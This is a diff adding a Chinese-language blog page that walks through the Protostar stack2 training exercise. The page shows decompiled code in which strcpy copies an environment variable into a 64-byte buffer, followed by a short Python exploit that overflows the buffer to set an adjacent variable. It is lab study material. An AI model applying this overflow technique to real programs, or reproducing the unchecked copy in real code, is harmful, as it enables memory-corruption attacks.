@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Protostar_stack2 - Dark&amp;Lord</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">Dark&amp;Lord</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Protostar_stack2</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1699349027399"
+                  >2023</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1699356630127"
+                  >2023</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><p><strong>运行该程序，得到：</strong></p>
+<img src="/_resources/eed487e8cc264fb8835cb1d5dd67299e.png" alt="0f48e8fdf53739b6f7d2c5331c7b00e0.png" width="556" height="56" class="jop-noMdConv" />
+<p><strong>按照输出设置环境变量后，再次执行：</strong></p>
+<img src="/_resources/004f6b9bbdd845ecb83a8f1ce69f2c35.png" alt="4c216a967c2ffbe124008e4681f06bf5.png" width="382" height="129" class="jop-noMdConv" />
+<p><strong>checksec:</strong></p>
+<p><strong><img src="/_resources/cae1c1949f9849ccb91059a5130d5ad4.png" alt="6ef7bf5fdcaf53c4bb684cdf2779770a.png" width="273" height="122" class="jop-noMdConv" /></strong></p>
+<p><strong>查看其反编译代码：</strong></p>
+<div><pre class="hljs"><code><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
+{
+    undefined auStack88 [<span class="hljs-number">64</span>];
+    <span class="hljs-type">int32_t</span> iStack24;
+    <span class="hljs-type">int32_t</span> iStack20;
+    
+    iStack20 = getenv(<span class="hljs-string">"GREENIE"</span>);
+    <span class="hljs-keyword">if</span> (iStack20 == <span class="hljs-number">0</span>) {
+        errx(<span class="hljs-number">1</span>, <span class="hljs-string">"please set the GREENIE environment variable\n"</span>);
+    }
+    iStack24 = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">strcpy</span>(auStack88, iStack20);
+    <span class="hljs-keyword">if</span> (iStack24 == <span class="hljs-number">0xd0a0d0a</span>) {
+        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"you have correctly modified the variable"</span>);
+    } <span class="hljs-keyword">else</span> {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Try again, you got 0x%08x\n"</span>, iStack24);
+    }
+    <span class="hljs-keyword">return</span>;
+}</code></pre></div>
+<p>本题中首先获取<code>GREENIE</code>环境变量，如果不存在则提示需要设置；</p>
+<p>然后判断<code>iStack24</code>是否等于<code>0xd0a0d0a</code></p>
+<p>exp如下：</p>
+<div><pre class="hljs"><code>In [<span class="hljs-number">1</span>]: <span class="hljs-keyword">import</span> os
+
+In [<span class="hljs-number">2</span>]: env_val = <span class="hljs-string">'a'</span>*<span class="hljs-number">64</span> + <span class="hljs-string">'\x0a\x0d\x0a\x0d'</span>
+
+In [<span class="hljs-number">3</span>]: os.putenv(<span class="hljs-string">'GREENIE'</span>,env_val)
+
+In [<span class="hljs-number">4</span>]: os.system(<span class="hljs-string">'./stack2'</span>)
+you have correctly modified the variable
+Out[<span class="hljs-number">4</span>]: <span class="hljs-number">10496</span></code></pre></div>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
